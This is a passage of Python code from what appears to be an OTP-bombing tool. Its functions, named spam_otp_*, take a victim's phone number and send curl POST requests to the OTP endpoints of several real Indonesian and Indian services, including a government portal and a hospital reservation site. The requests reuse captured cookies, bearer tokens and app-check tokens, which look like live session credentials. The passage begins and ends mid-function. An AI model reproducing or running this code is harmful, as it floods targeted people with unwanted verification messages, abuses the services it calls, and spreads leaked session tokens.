__sts=eyJzaWQiOjE3ODcxMzY4ODgzNjksInR4IjoxNzg3MTM2ODk5MDUzLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkZrbHViLWdlbmVyYXNpLW1hanUlMkZyZWdpc3RlciUzRnJlZmVycmFsJTNEaHR0cHMlM0ElMkYlMkZ3d3cuZ2VuZXJhc2ltYWp1LmNvLmlkJTJGIiwicGV0IjoxNzg3MTM2ODk5MDUzLCJzZXQiOjE3ODcxMzY4ODgzNjksInBVcmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkYiLCJwUGV0IjoxNzg3MTM2ODg4MzY5LCJwVHgiOjE3ODcxMzY4ODgzNjl9; _clsk=1l4an9c%5E1787136899807%5E2%5E1%5Eu.clarity.ms%2Fcollect; ttcsid_C4RIGKH6H18A0MH113T0=1787136887112::rCra0ykXy8_h7KsBM04x.1.1787136940557.1; ttcsid=1787136887119::o07SA2cbudxtC_Hsy8Yh.1.1787136940557.0::1.5427.11326::53296.11.324.1008::52530.9.297; _ga_KHHX33L6LL=GS2.1.s1787136886$o1$g1$t1787136940$j6$l0$h0; _gcl_au=1.1.1934825587.1787136884.805340981.1787136911.1787136910.1774024647.1787136891.1787136940; AWSALB=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==; AWSALBCORS=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==' \\
  -H 'priority: u=1, i' \\
  --data-raw 'firstname={firstname}&msisdn={phone}&password={password}&mother_status=7&ispregnant=Y&pregnancyweek=1&isonpregnancyprogram=N&children_dob=&is_code_refferal_event_code=&refferal_code_event_code=&query_params%5B0%5D%5Breferral%5D=https%3A%2F%2Fwww.generasimaju.co.id%2F&auth_token={auth_token}&auth_token_prefix=registration'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('status') == 'success' or data.get('success'):
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('result') and 'success' in str(data.get('result')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_norkaroots(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://sso.norkaroots.kerala.gov.in/send-whatsapp-otp' \\
  -H 'host: sso.norkaroots.kerala.gov.in' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: PFanayOE9IDJ6ecbyCBAgPXmasq0DOuTAmYDBbgU' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'origin: https://sso.norkaroots.kerala.gov.in' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://sso.norkaroots.kerala.gov.in/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6Ik9oc3lDS1R2ZzJCWjJDY25sQ1FVcVE9PSIsInZhbHVlIjoiWkRMWFhQUHlBNHFvUTF3TmoybC90MHZiRzE1ekN1RUtBUDYxTUpYT0FXalBoVnp2MFdOYldUaGFlY2lzSkNINFNmUGloTEdSMU9YUHY4M045TEFnREcyK2pNTk5manIvM1ZtRmc4Sk1vZ3FacE5mQmN5NXVlZVdXYVFtZ1BubWwiLCJtYWMiOiI4M2QzZjc5YzljNjVkZDJiNGQxOGRmY2RhMmUyMTQ1NTQ2YjQ4NTBiYmRmMjA1OGRlM2I3ZmNlYWM5ZGRmYTZjIiwidGFnIjoiIn0%3D; norka_roots_sso_portal_session=eyJpdiI6ImtxUG9GTXVtTXkxVWxra2NWSkhvR2c9PSIsInZhbHVlIjoiTnlKeEkyNUVKOXBha3pETDgySzBnNDg2STRYTXU3ZnNFemxabnIvZHBrVzFrNFloK05Ea2EzVzJOaGhsbWRXQlJNbWFKNi9ENzJZb1RvTUxGbzNNSjQ5Q0szVzZvZURTOG02VmZDakF4SDVRWEF5SDZPZkhoSzJxWWhKTU9oTGMiLCJtYWMiOiIwMjJiZjY5MWU4OTkxZjAxNzNkMzM3OWI1ODYwZWQwOWY0ZjllYWNkMTFkOTMzNDdmMDNlZWFmOTdkODM4MTI5IiwidGFnIjoiIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw 'whatsapp_number={phone}&whatsapp_country_code=62&whatsapp_country_iso_code=id'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_kpoin(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json
        import random
        import string

        otp_type = ''.join(random.choices(string.digits, k=6))

        curl_cmd = f"""curl -s -X POST 'https://app.kpoin.com/api/bff/v1/notification/sendotp' \\
  -H 'host: app.kpoin.com' \\
  -H 'applicationbrand: 0' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'datetimetick: 639227634232580000' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'applicationchannel: 901101' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'applicationstoreid: 0' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://app.kpoin.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://app.kpoin.com/registration' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: visid_incap_3193850=KSLZkw3rSLCIdgxnG1LswfKchWoAAAAAQUIPAAAAAADtP1pV9DavhkjEGjxo5FyR; incap_ses_735_3193850=cukdVA7pdgcKbznhtD4zCvKchWoAAAAAHsqxaKqc92iy2SZvSmff8Q==; incap_ses_1746_3193850=Ma70GopLew+tpns7ZQo7GPachWoAAAAAIbXttysbxxBFyqv+jfrzDA==; _ga=GA1.1.1435000739.1787141371; _fbp=fb.1.1787141372954.767928535296203971; _tt_enable_cookie=1; _ttp=01M0CYTF8JWD243X9ZGVY2FH98_.tt.1; androidBannerClosed=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidHJ1ZSIsImlhdCI6MTc4NzE0MTM3OCwiZXhwIjoxNzg3NDAwNTc4fQ.m3crPZsDXe4smAhYEWNhOFOdEm3VkxWt3lMiC8AC1DU; _ga_XH6QC1GPNY,G-FCEP7R9YXY,G-E0QWTN64ED=GS2.1.s1787141390$o1$g0$t1787141390$j60$l0$h0; _ga_XH6QC1GPNY=GS2.1.s1787141371$o1$g1$t1787141397$j34$l0$h752977670; _gcl_au=1.1.1659628713.1787141369.-.-.1787141371.1651972348.1787141372.1787141397; _ga_E0QWTN64ED=GS2.1.s1787141371$o1$g1$t1787141398$j33$l0$h455275594; _ga_FCEP7R9YXY=GS2.1.s1787141372$o1$g1$t1787141398$j34$l0$h139101688; _Tk=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImFjY2Vzc1Rva2VuIjoiZTJhZTkyZWQzZDVkZTM1YzQyNGEyZDM4YmI0MmE2N2I0ZGMzMjIzOTg5ZGJiMTRiMTg3ZjIzMmUwYzRhYTFlYzAxZWNlMmYxYzlkODJiMmVlZDc1YzY4Yzk1NGFmYjdhZjc1ODJkYTAzM2Y4ZTgwYmQyZjY3YWQwMTYxMzYzMzU4OGFjNTY4ZWY2OGQyNGUwOWMxZGQ4ZDA1MjQxYmFiM2Q1NGE0MjBiMzNmYzBlYWZiYWYyOGUwM2Q5ZjIzZTQ5YjFiNjc1YzhjNDNhMjA3NDAyNjhiZDIyMmRjNDNjZGMxOTc5YTM2ZjcxOTY0ZmMzZjE3MDc0MGM5Y2RkZWZlYWY0Njg3YTY5Yzk0MjZmMDM0OGYzNDUwZTg5OGM0YWI2NjQ0ZTE5YzJhMDdjYzM4Zjk4NzU1ZmM4NGU5YzI4MGJiYmVmZmYwYzFhM2Q0NDQyNTAxYzVlYTgyZTMzY2VmZTM5MzViNjk4ZmJjOWVjOWRkYTRlNWEwYiIsImV4cGlyZWQiOiI2MzkyMjczOTQwMDAwMDAwMDAifSwiaWF0IjoxNzg3MTQxNDAwLCJleHAiOjE3ODc0MDYwMDB9.AzOTIf9SzmaSe0MYRiTGUK6RHhp4UD30NVunGF-SBhY; ttcsid=1787141373225::bgd_SWk9Rs6CgIaLfruw.1.1787141420005.0::1.19758.25594::46657.5.361.870::0.0.0; ttcsid_CRBTL1JC77U6RBG4JJL0=1787141373222::USQsoHY5IKaPHuP-dQ7i.1.1787141420006.1; _Ureg=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7IlBob25lTm8iOiIwODM4MzIxMTA1MDkiLCJSZWZlcnJhbENvZGUiOiIifSwiaWF0IjoxNzg3MTQxNDIwLCJleHAiOjE3ODc0MDA2MjB9.xvsHxg22HWujKk9ueKqr_dmmR3_uJE-w86tS4sBLy7w' \\
  -H 'priority: u=1, i' \\
  -d '{{"UniqueID":"{phone}","NotifType":"109104","OtpType":"{otp_type}","OtpDigit":6}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_99co(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('62'):
            phone = '62' + phone

        phone = '+' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://www.99.co/id/api/biz/messaging/otp-events' \\
  -H 'host: www.99.co' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'baggage: sentry-environment=production,sentry-release=c928e07fcd93cfdde3580c19dc671d781ef22fa0,sentry-public_key=a05fe8bc05a068bbf916024d2d1e9ed2,sentry-trace_id=ab490fa074854059a800588a8f67ff14,sentry-org_id=396133,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.5645084361255753,sentry-sample_rate=0' \\
  -H 'sentry-trace: ab490fa074854059a800588a8f67ff14-ae1ab7e4072b3ec5-0' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://www.99.co' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.99.co/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _99-acs-token=eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w; _99-ref-token=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0MjllZjYyYy03NDU4LTRhMDQtOTNlNC1mMDJjYWNiZjY4NTcifQ.eyJleHAiOjE3ODc3NDk3MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiZjI3OTlmYjktYTQ5ZC00MjY4LTk3MzEtMDE1NTExNWE2ODUxIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwiYXVkIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiUmVmcmVzaCIsImF6cCI6ImZyb250ZW5kLWFwcCIsInNlc3Npb25fc3RhdGUiOiIzMjA4YWJlNC0yNWY3LTQyMDItYTc5Yy03ZGI0NzM5N2MxZGUiLCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIn0.40VVHypaU2lxlcNif3cyNKNQ6NqCESpC9F6gpa4R4TA; country=ID; _fbp=fb.1.1783634838553.530234959419040031; __cf_bm=mHd7ebZZvr9QC4g39gJRTX7n8RbxTABa2vptnPN2jnY-1787144797.8016622-1.0.1.1-XuJ5D0MeHxyWcNU8ijk.OhbYJMH9JyHuoOPWG8NxQlnURKBzM92HhOPEnC22T6gv1lGsn.Q94dkbDfxAh0obTw30tgNFaVAYsKCcoHDul_e5o4iQ3AdY4oQVdsRmqus9; NEXT_LOCALE=en; nid=1468adb9-ef60-4b93-80f8-67f6d905429b; ajs_anonymous_id=1468adb9-ef60-4b93-80f8-67f6d905429b; WZRK_G=c5063a1d88cc4d57b481ff69e6271672; WZRK_S_6Z6-5Z4-R56Z=%7B%22p%22%3A1%2C%22s%22%3A1787144803%2C%22t%22%3A1787144805%7D; dbb_rum=%7B%22date%22%3A1787144796651%2C%22id%22%3A%22mt03vai3tjl67ja56e.i%22%2C%22hnc%22%3A1%2C%22nc%22%3A1%2C%22conv%22%3A%5B%5D%2C%22sample%22%3Afalse%7D; g_state={"i_l":0,"i_ll":1787144808996,"i_b":"4d9tCoq6T065IxLpbI3/B9pCnohc4rpf66c/WYlUFiM","i_e":{"enable_itp_optimization":24},"i_et":1787144808996}; _xsrf=2|c7bf88e2|2ee5e97e7c0d5421580d7ed032370b4e|1787144810; _gcl_au=1.1.642346103.1783634927; _gid=GA1.2.998693239.1787144812; _ga_6C5VMQ1JNP=GS2.1.s1787144812$o1$g0$t1787144813$j59$l0$h0; _ga_GG21BH9GS5=GS2.1.s1787144813$o1$g0$t1787144813$j60$l0$h0; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.597Z%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22GAhcAYFrDoxEYfSp94nX%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.600Z%22%7D; _ga_9FDXXVZSH0=GS2.1.s1787144814$o1$g0$t1787144814$j60$l0$h0; meid=ddb8aaf2-e634-40d3-bdde-198c0d309838; intercom-id-e90pxaa2=a14209fa-dc61-4abe-94cc-e50af422bdd5; intercom-session-e90pxaa2=; intercom-device-id-e90pxaa2=154bdeab-bd24-418e-b61a-3d77de4e79b9; _ga_ZJWD7VVPHG=GS2.2.s1787144822$o2$g0$t1787144822$j60$l0$h0; _ga=GA1.1.1461816152.1783634837; cto_bundle=RcS8X19sbFllSDZ6eG1VcEtESVM0ZDglMkJycFA1RlFIRGg4WGxyS01OcUV3MjdYVlZtdlhrcUglMkJ1c2J6MXN6UTVHVjR0Mnc5ZHkzZDdzOVVRcVVTOVlKUXlTUTZXV3BDeVZ6UXNmbzZhc0tBS1ElMkIxUzclMkJSYUx2NzZ2UDU3OURyY0lhc0tiaFc2JTJCa0dHRWlFSm1meWhMakZtMEJRJTNEJTNE; _ga_Q823T54LSF=GS2.1.s1787144823$o2$g1$t1787144905$j38$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"brand":"99id","destination_address":"{phone}","type_id":2}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_bunda_cms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
  -H 'host: cms.bunda.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-firebase-appcheck: eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjU5NjU2Mzg5ODEwMzp3ZWI6Y2VmNTMwYWNmYjgzZGY4NDdhZWRmMiIsImF1ZCI6WyJwcm9qZWN0cy81OTY1NjM4OTgxMDMiLCJwcm9qZWN0cy9ibWhzLXdlYi1hcHBzIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX3YzIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzU5NjU2Mzg5ODEwMyIsImV4cCI6MTc4NzIzNzQ1MCwiaWF0IjoxNzg3MTUxMDUwLCJqdGkiOiJ4YUEydzFUWnpxVHgtU2NHOGVQUGRqRkV3OHRVWUZhdXhfa3ExckthNVpBIn0.0GtUrReLPvBzyUZSeojw_D4CQfRcIhYS4kwTpuwMmbpQ8VquBJUyaEcSl28Rpq0_LrEcRkz-nHrAHtD2V-trDLQYzXIq2rC-JYWm3YadIDgh3FQ_nWrzdUUHfDLwCpgUU0QdopTXt1IkqEVK29vHjndK-s4yADZtVkV61DNzUKQKqCwcEH2Imw9q7GFEo19EhIYLIVd06Zdvit_GnPr93zYtuwzuIMPXcOghmqzsgER0vec2JQAr7oIc7Za47y_MNhtfJ5duSoDDb0MzyHaMJ0xX_-s6WIWT8gUI2uCwW2asUALRSouydvlOgMGpBkcZHAThBLYJ3k11iNEUUV-nwVb15PUjLM6y3XRHWXwEZ_1WAVy3GDFk-mxnGY8ez2X1xX64JJSVJMMqbwl_V0XccWPtlYEBP3MvmpgVl33lF6Pb9ZMaVAVv2C2h_8V6ik0rhsequDyDgd1as20UUagHfZEUIJCiMhktSc2yykuoGiXVTasq5dROxcQgEwPYN66x' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'x-locale: id' \\
  -H 'origin: https://www.bunda.co.id' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.bunda.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone_number":{phone},"type":"auth"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_eiger(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('62'):
            phone = '62' + phone

        phone = '+' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://careloyalty.eigerindo.co.id/api/v1/otp/send' \\
  -H 'host: careloyalty.eigerindo.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://club.eigeradventure.com' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://club.eigeradventure.com/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -d '{{"mobile_phone":"{phone}","via":"whatsapp"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_pkumayong(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://reservasi.pkumayong.com/reqOTP' \\
  -H 'host: reservasi.pkumayong.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://reservasi.pkumayong.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://reservasi.pkumayong.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
